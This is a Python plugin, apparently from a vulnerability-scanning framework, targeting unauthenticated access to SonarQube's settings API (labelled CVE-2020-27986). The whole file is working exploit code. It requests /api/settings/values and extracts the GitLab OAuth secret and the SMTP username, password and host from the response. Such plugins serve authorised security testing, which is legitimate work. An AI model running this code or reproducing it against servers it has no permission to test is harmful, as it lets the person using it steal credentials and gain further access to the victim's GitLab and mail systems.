# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "SonarQube未授权访问",
        "description": "-",
        "datetime": "2022-01-03"
    }

    def url(self) -> dict:
        """ 验证方法 """
        r = self.request(
            method='get',
            path='./api/settings/values',
            timeout=15
        )
        if r.status_code == 200 and 'settings' in r.text:
            data = []
            for i in r.json()['settings']:
                if 'sonar.auth.gitlab.applicationId' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'sonar.auth.gitlab.url' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'sonar.auth.gitlab.secret' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_secure_connection.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_host.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_username.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_password.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_port.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
            return {
                "LoopholeInfo": {"app": "SonarQube", "data": data, "name": "CVE-2020-27986"}
            }
